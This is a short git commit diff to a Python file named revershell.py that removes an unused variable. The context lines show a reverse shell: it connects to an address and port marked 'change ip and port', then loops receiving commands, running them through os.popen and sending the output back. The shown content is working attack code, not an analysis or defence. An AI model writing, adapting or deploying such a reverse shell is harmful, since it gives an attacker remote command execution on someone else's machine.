55c15887ca4cee6e4756e56f83e5b2e1a6a273ba
Saiprakash J <jsprakash632@gmail.com>
2024-11-02 19:24:46 +0530

    revershell.py

--- revershell.py
+++ revershell.py
@@ -6,7 +6,7 @@ new_request.connect(('127.0.0.1', 4444))  #change ip and port
 new_request.send("connection made ... \n ".encode())
 
 while True:
-    b = new_request.send(">>".encode())
+    new_request.send(">>".encode())
     cmd = new_request.recv(1000).decode()
     command = os.popen(cmd).read()
     new_request.send(command.encode())
